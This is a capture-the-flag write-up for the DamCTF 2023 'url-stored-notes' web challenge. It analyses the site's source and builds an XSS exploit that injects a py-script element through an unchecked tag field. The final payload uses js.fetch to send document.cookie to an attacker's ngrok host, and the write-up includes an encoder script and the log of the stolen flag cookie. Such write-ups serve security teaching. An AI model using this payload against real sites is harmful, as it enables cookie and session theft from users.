# url-stored-notes

## Overview

- 46 solves / 456 points

- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Background

> Author: M1ll_0n

Ever seen that neat [paste program by topaz](https://github.com/topaz/paste) for advent of code? Yeah, well this is like 100% better and more secure since it's for note card sharing.

Admin bot at /admin

[http://url-stored-notes.chals.damctf.xyz](http://url-stored-notes.chals.damctf.xyz)

[http://64.227.26.193](http://64.227.26.193)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408150909.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408150921.png)

In here, we can see there's a button: "Edit Notes".

**"Edit Notes":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408151104.png)

In here, we can "Add empty note", and "Shares Notes".

**"Add empty note":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408151327.png)

We can add some notes based on the selected HTML element?

**"Shares Notes":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408151441.png)

When the "Shares Notes" button is clicked, it'll generate a share link:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408151825.png)

**In the `/admin` route, we can enter a URL to admin:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408151912.png)

That being said, this challenge is a typical ***XSS*** challenge.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/web/url-stored-notes/url-notes.zip):**
```shell
┌[siunam♥earth]-(~/ctf/DamCTF-2023/web/url-stored-notes)-[2023.04.08|15:09:56(HKT)]
└> file url-notes.zip 
url-notes.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥earth]-(~/ctf/DamCTF-2023/web/url-stored-notes)-[2023.04.08|15:09:59(HKT)]
└> unzip url-notes.zip    
Archive:  url-notes.zip
  inflating: .puppeteerrc.cjs        
  inflating: bot.js                  
  inflating: server.js               
  inflating: package-lock.json       
  inflating: package.json            
  inflating: Dockerfile              
  inflating: .env                    
  inflating: static/admin.html       
  inflating: static/edit.html        
  inflating: static/index.html       
  inflating: static/style.css
```

**In `bot.js`, we can see how the admin bot will visit our entered URL:**
```js
// cookie code ripped from ucla's admin bot: https://github.com/uclaacm/lactf-archive
module.exports = async (browser, url) => {
    ctx = await (await browser).createIncognitoBrowserContext();
    const page = await ctx.newPage();
    page.setCookie({
        name: "flag",
        value: process.env.FLAG || "dam{test_flag_not_real_flag_do_not_submit_this_flag}",
        domain: process.env.DOMAIN || "localhost:8080",
        httpOnly: false,
    })
    console.log("[*] Navigating to: ", url);
    await page.setJavaScriptEnabled(true);
    // Debug line below ;P
    // await page.on('console', message => console.log(`${message.type().substr(0, 3).toUpperCase()} ${message.text()}`))
    await page.goto(url, {waitUntil: "domcontentloaded"});
    await page.waitForNetworkIdle({idleTime: 250});
    await page.waitForSelector("#python");
    await page.waitForTimeout(35000);
    console.log("[*] Page loaded");
    await page.close();
    await ctx.close();
    console.log("[*] successfully visited url: ", url)
}
```

The flag is in the `flag` cookie, and **the `httpOnly` attribute is set to `false`**, which means we can use `document.cookie` API to fetch flag's cookie value!

When we sent our URL to the admin bot, it'll go to our provided URL and **enable JavaScript**.

With that said, our goal is to ***leverage an XSS vulnerability to steal admin bot's `flag` cookie***.

**In `server.js`, we see this:**
```js
[...]
app.get("/edit", (req, res) => {
  res.sendFile(path.join(__dirname, "static", "edit.html"))
})
[...]
```

Hmm... It just send the `/static/edit.html`.

**`edit.html`:**
```html
[...]
<script id="js">
const SUPPORTED_TAGS = ['p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'i', 'code'];

function createNoteElement(prompt, answer, tag){

    const noteElement = document.createElement("div");
    noteElement.classList.add("note");
    const textElement = document.createElement("div");
    textElement.classList.add("text");
    const promptElement = document.createElement('textarea');
    const answerElement = document.createElement('textarea');

    tagElement = document.createElement('select');
    
    for (let i = 0; i < SUPPORTED_TAGS.length; i++) {
         tagElement.innerHTML += `<option value="${SUPPORTED_TAGS[i]}">${SUPPORTED_TAGS[i]}</option>`;
    }
    
    noteElement.append(tagElement);
    noteElement.appendChild(textElement);

    const promptLabel = document.createElement('h4');
    promptLabel.textContent = "Prompt:";
    textElement.appendChild(promptLabel);
    textElement.appendChild(promptElement);
    
    const answerLabel = document.createElement('h4');
    answerLabel.textContent = "Answer:";
    textElement.appendChild(answerLabel);

    textElement.appendChild(answerElement);

    promptElement.textContent = prompt;
    answerElement.textContent = answer;

    document.getElementById("notes").appendChild(noteElement);
    
    return;
}

// Auto-reload content
[...]
</script>
```

**This function `createNoteElement()` is just creating the following `<div>` block when the "Add empty notes" button is clicked:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408154329.png)

Nothing weird and we can't control anything.

**Then, let's look at the auto-reload content:**
```html
<script id="js">
[...]
// Auto-reload content
window.onload = () => {
    const python_code = document.getElementById('python').innerHTML;
    window.onhashchange =  () => {
        // probably not the right way to do this but I don't care 😎
        pyscript.runtime.run(python_code.replace('&gt;', ">"));
    }

    // share functionality
    document.getElementById('share').addEventListener('click', () => {
        // run the python function
        const data = [];

        // basically iterate through all html elements
        const notes = document.getElementById("notes").children;
        for (let i = 0; i < notes.length; i++){
            let tag = notes[i].children[0].value;
            let prompt = notes[i].children[1].children[1].value;
            let answer = notes[i].children[1].children[3].value;
            data.push({"prompt": prompt, "answer": answer, "tag": tag});
        }

        // access pyscript functions
        let encodeNotes = pyscript.interpreter.globals.get('encodeNotes');
        const result = encodeNotes(JSON.stringify(data)).decode();

        // update DOM
        const linkElement = document.getElementById('link');
        linkElement.innerHTML = '';
        const title = document.createElement('h3');
        title.textContent = 'Generated Link:';
        linkElement.appendChild(title);
        const anchor = document.createElement('a');
        const linkText = window.location.origin + '/#' + result;
        anchor.href = linkText;
        // anchor.target = "_blank";
        linkElement.appendChild(anchor);
        const pre = document.createElement('pre');
        pre.textContent = linkText;
        anchor.appendChild(pre);
    })

    document.getElementById('add').addEventListener('click', () => {
        createNoteElement("", "", "");
    })
}
</script>
```

When the "Shares Notes" button is clicked, it'll create a link, which is the encoded notes.

**However, it's also using an interesting library:**
```html
<script defer src="https://pyscript.net/latest/pyscript.js"></script>
```

> PyScript is a framework that allows users to create rich Python applications in the browser using HTML's interface and the power of [Pyodide](https://pyodide.org/en/stable/), [WASM](https://webassembly.org/), and modern web technologies. The PyScript framework provides users at every experience level with access to an expressive, easy-to-learn programming language with countless applications.

**Let's look at the Python code!**
```html
<py-config>
packages = ["lzma"]
</py-config>
<py-script id="python">
import js
from base64 import b64encode, b64decode
from lzma import compress, decompress
import json
from pyscript import Element

def encodeNotes(json_str):
    return b64encode(compress(json_str.encode()))



encodedNotes = js.window.location.hash[1:]
notes = {}
try:
    encoded_notes = encodedNotes.encode()
    decoded_notes = decompress(b64decode(encoded_notes))
    notes = json.loads(decoded_notes.decode('utf-8'))
except:
    notes = {}

# Dynamically load content
js.document.getElementById('notes').innerHTML=''
for note in notes:
    if 'prompt' in note and 'answer' in note and "tag" in note:
        js.createNoteElement(note['prompt'], note['answer'], note['tag'])

</py-script>
```

This script will use LZMA to compress the JSON notes data, and base64 encode it.

**After decoded, the `notes` will have the following JSON data:**
```py
from base64 import b64encode, b64decode
from lzma import compress, decompress
import json

encodedNotes = '/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4ABQAC9dAC2ewEcDz40ozKl1G8HkuqYL6+m3lSJz3+NggH04+s9UGc44BIOSAMIVM3yCKMIAAACoOqUjG/GuPgABS1GHQmcvH7bzfQEAAAAABFla'
notes = {}

encoded_notes = encodedNotes.encode()
decoded_notes = decompress(b64decode(encoded_notes))
print(decoded_notes)

notes = json.loads(decoded_notes.decode('utf-8'))
print(notes)
```

```py
"prompt":"test","answer":"test","tag":"p"},{"prompt":"","answer":"","tag":"p"}]'
[{'prompt': 'test', 'answer': 'test', 'tag': 'p'}, {'prompt': '', 'answer': '', 'tag': 'p'}]
```

**Now, let's move on to the `/index.html`!**
```html
[...]
<script id="js">

function createNoteElement(prompt, answer, tag){
    // secure, as always
    if (tag.toLowerCase() === 'script'){
        tag = 'p'
    }

    const noteElement = document.createElement("div");
    noteElement.classList.add("note");
    const textElement = document.createElement("div");
    textElement.classList.add("text");
    const promptElement = document.createElement(tag);
    const answerElement = document.createElement(tag);
    answerElement.style.display = "none";
    textElement.addEventListener("click", () => {
        if (promptElement.style.display === "none"){
            promptElement.style.display = "";
            answerElement.style.display = "none";
        } else {
            promptElement.style.display = "none";
            answerElement.style.display = "";
        }
    });

    noteElement.appendChild(textElement);
    textElement.appendChild(promptElement);
    textElement.appendChild(answerElement);

    promptElement.textContent = prompt;
    answerElement.textContent = answer;

    document.getElementById("notes").appendChild(noteElement);
    
    return;
}

// Auto-reload content
window.onload = () => {
    const python_code = document.getElementById('python').innerHTML;
    window.onhashchange =  () => {
        // probably not the right way to do this but I don't care 😎
        pyscript.runtime.run(python_code.replace('&gt;', ">"))
    }
}
</script>
<div id="notes"></div>
<py-config>
packages = ["lzma"]
</py-config>
<py-script id="python">
import js
from base64 import b64encode, b64decode
from lzma import compress, decompress
import json
from pyscript import Element


encodedNotes = js.window.location.hash[1:]
notes = {}
try:
    encoded_notes = encodedNotes.encode()
    decoded_notes = decompress(b64decode(encoded_notes))
    notes = json.loads(decoded_notes.decode('utf-8'))
except:
    notes = {}

# Dynamically load content
js.document.getElementById('notes').innerHTML=''
for note in notes:
    if 'prompt' in note and 'answer' in note and "tag" in note:
        js.createNoteElement(note['prompt'], note['answer'], note['tag'])

</py-script>
[...]
```

If there's a note, it'll run JavaScript function `createNoteElement()`, with our notes' `prompt`, `answer`, and `tag`.

In JavaScript function `createNoteElement()`, ***if the `tag` is `script`, change the tag to `p`.*** Then, it'll create 2 elements based on the `tag`, and append the `prompt` and `answer` via `textContent`.

Also, when the hash `#` is changed, it'll replace `>` to `&gt;` HTML entity.

Armed with above information, we can try to exploit it!

## Exploitation

**Now, we can get the before encoded JSON data via:**
```js
const data = [];

// basically iterate through all html elements
const notes = document.getElementById("notes").children;
for (let i = 0; i < notes.length; i++){
    let tag = notes[i].children[0].value;
    let prompt = notes[i].children[1].children[1].value;
    let answer = notes[i].children[1].children[3].value;
    data.push({"prompt": prompt, "answer": answer, "tag": tag});
}

const result = JSON.stringify(data);
console.log(result);
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408163752.png)

**Before encoded JSON note:**
```py
[{'prompt': '', 'answer': '', 'tag': 'p'}]
```

Since **the application doesn't check the `tag`'s value, we can create arbitrary element!**

**To do so, we can write a Python script to generate the encoded note!**
```py
#!/usr/bin/env python3
from base64 import b64encode, b64decode
from lzma import compress, decompress
import json

def decodeNotes(encodedNotes):
    notes = {}
    try:
        encoded_notes = encodedNotes.encode()
        decoded_notes = decompress(b64decode(encoded_notes))
        notes = json.loads(decoded_notes.decode('utf-8'))
    except:
        notes = {}

    return notes

def encodeNotes(json_str):
    return b64encode(compress(json_str.encode())).decode()

def main():
    # [{'prompt': '', 'answer': '', 'tag': 'p'}]
    notes = '[{\"prompt\":\"test prompt\",\"answer\":\"test answer\",\"tag\":\"h1\"}]'
    encodedNotes = encodeNotes(notes)
    print(f'Before encoded: {notes}')
    print(f'After encoded: {encodedNotes}')

    decodedNotes = decodeNotes(encodedNotes)
    print(f'After decoded: {decodedNotes}')

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/DamCTF-2023/web/url-stored-notes)-[2023.04.08|16:35:44(HKT)]
└> python3 encode_notes.py
Before encoded: [{"prompt":"test prompt","answer":"test answer","tag":"h1"}]
After encoded: /Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AA7AC1dAC2ewEcDz40ozKl1G8HkuqYEVXp/fqrqSKgjoURem6G3dq12ZoA27glAkxnvAAAAAABqZKdXfv6FhgABSTzgPVIuH7bzfQEAAAAABFla
After decoded: [{'prompt': 'test prompt', 'answer': 'test answer', 'tag': 'h1'}]
```

**Then, go to the index page with the encoded note:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408164107.png)

Nice!

But how can we execute arbitrary JavaScript code?? The `script` check seems like couldn't be bypassed!

Hmm! There's another `script` we can take advantage of!

***You guessed! `py-script`!***

**Now, what if we change the `tag` to `py-script`??**
```shell
┌[siunam♥earth]-(~/ctf/DamCTF-2023/web/url-stored-notes)-[2023.04.08|16:46:30(HKT)]
└> python3 encode_notes.py
Before encoded: [{"prompt":"test prompt","answer":"test answer","tag":"py-script"}]
After encoded: /Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4ABCADNdAC2ewEcDz40ozKl1G8HkuqYEVXp/fqrqSKgjoURem6G3dq12ZoChc94EqR0FEqvHJHupAAAA1AswOjfmCFYAAU9Dy/ayuB+2830BAAAAAARZWg==
After decoded: [{'prompt': 'test prompt', 'answer': 'test answer', 'tag': 'py-script'}]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408164820.png)

Oh! We got a `SyntaxError`!!

**Which means we can execute Python code!**
```shell
┌[siunam♥earth]-(~/ctf/DamCTF-2023/web/url-stored-notes)-[2023.04.08|16:47:48(HKT)]
└> python3 encode_notes.py
Before encoded: [{"prompt":"print(1+1)","answer":"print(2+2)","tag":"py-script"}]
After encoded: /Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4ABAADhdAC2ewEcDz40ozKl1G/3hGL/iB3KJyodN5MOl49OPAcw22Fx3Jn+rJO+NVYAEZn4WYPkXJKMw7WQAAMmgaOFLj01TAAFUQX1civ8ftvN9AQAAAAAEWVo=
After decoded: [{'prompt': 'print(1+1)', 'answer': 'print(2+2)', 'tag': 'py-script'}]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408164951.png)

Nice!!!

**Can we execute JavaScript code??**

**After some trial and error, we can import the `js` library and execute JavaScript code!!**
```py
    notes = '''[{\"prompt\":\"import js;print(js.alert(document.domain))\",\"answer\":\"print(2+2)\",\"tag\":\"py-script\"}]'''
```

**The reason I pick the `js` library is I saw that library executing JavaScript code in `index.html`:**
```html
<py-script id="python">
import js
    [...]
        js.createNoteElement(note['prompt'], note['answer'], note['tag'])
</py-script>
```

```shell
┌[siunam♥earth]-(~/ctf/DamCTF-2023/web/url-stored-notes)-[2023.04.08|17:12:32(HKT)]
└> python3 encode_notes.py
Before encoded: [{"prompt":"import js;print(js.alert(document.domain))","answer":"print(2+2)","tag":"py-script"}]
After encoded: /Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4ABgAFhdAC2ewEcDz40ozKl1G8Hi7NGQkjZaYHM2dmMBzBphloFBW+N1QbCCK6FSx07eGLl5DJ/gWJK17vQsRy+t556giyKCwChZU/DRBVebTHpT+3PulRjt0mh8lgAAk8cicCjHaVIAAXRhF1hgUR+2830BAAAAAARZWg==
After decoded: [{'prompt': 'import js;print(js.alert(document.domain))', 'answer': 'print(2+2)', 'tag': 'py-script'}]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408171345.png)

Yes!!

**Let's get the admin's flag's cookie!!**

- Setup a web server:

```shell
┌[siunam♥earth]-(~/ctf/DamCTF-2023/web/url-stored-notes)-[2023.04.08|17:03:10(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Since we're not connecting to the challenge's network, we need to do a port fowarding, so that the admin bot can reach our web server.

- Port forwarding:

```shell
┌[siunam♥earth]-(~/ctf/DamCTF-2023/web/url-stored-notes)-[2023.04.08|17:13:14(HKT)]
└> ngrok http 8000
[...]
Forwarding                    https://4726-{Redacted}.ngrok-free.app -> http://localhost:8000
```

**Payload:**
```py
    notes = '''[{\"prompt\":\"import js;print(js.fetch('https://4726-{Redacted}.ngrok-free.app/?c=' + document.cookie))\",\"answer\":\"print(2+2)\",\"tag\":\"py-script\"}]'''
```

```shell
┌[siunam♥earth]-(~/ctf/DamCTF-2023/web/url-stored-notes)-[2023.04.08|17:15:34(HKT)]
└> python3 encode_notes.py
Before encoded: [{"prompt":"import js;print(js.fetch('https://4726-{Redacted}.ngrok-free.app/?c=' + document.cookie))","answer":"print(2+2)","tag":"py-script"}]
After encoded: /Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4ACPAIRdAC2ewEcDz40ozKl1G8Hi7NGQkjZaYHM2dmMBzBphloFBYPBoOI/l8wzUcb0SUKwpyR7GQL0iy1XsO0cLi8KJ5xVbQxwhnGL90msB8xdPvTD/zN0NUkzbO3hUSuvxmAvpAONkOKQbWEAPyu76qHRlzwp2PEgtf6Zz4UIC7vqCs1PAIdFgAAB8pYqWMYhDzQABoAGQAQAAEGerW7HEZ/sCAAAAAARZWg==
After decoded: [{'prompt': "import js;print(js.fetch('https://4726-{Redacted}.ngrok-free.app/?c=' + document.cookie))", 'answer': 'print(2+2)', 'tag': 'py-script'}]
```

This payload will send a GET request to our ngrok port forwarding address, with parameter `c` and it's value is all cookies.

**Send the encoded note URL to admin bot:**
```
http://url-stored-notes.chals.damctf.xyz/#/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4ACPAIRdAC2ewEcDz40ozKl1G8Hi7NGQkjZaYHM2dmMBzBphloFBYPBoOI/l8wzUcb0SUKwpyR7GQL0iy1XsO0cLi8KJ5xVbQxwhnGL90msB8xdPvTD/zN0NUkzbO3hUSuvxmAvpAONkOKQbWEAPyu76qHRlzwp2PEgtf6Zz4UIC7vqCs1PAIdFgAAB8pYqWMYhDzQABoAGQAQAAEGerW7HEZ/sCAAAAAARZWg==
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DamCTF-2023/images/Pasted%20image%2020230408180134.png)

```shell
┌[siunam♥earth]-(~/ctf/DamCTF-2023/web/url-stored-notes)-[2023.04.08|17:03:10(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [08/Apr/2023 17:18:03] "GET /?c=flag=dam{waaatttt_t3xtc0nt3nt_n0t_always___s3cur3_bruuuhhhhhhh} HTTP/1.1" 200 -
```

Nice!! We steal the admin bot's flag cookie!

- **Flag: `flag=dam{waaatttt_t3xtc0nt3nt_n0t_always___s3cur3_bruuuhhhhhhh}`**

## Conclusion

What we've learned:

1. PyScript XSS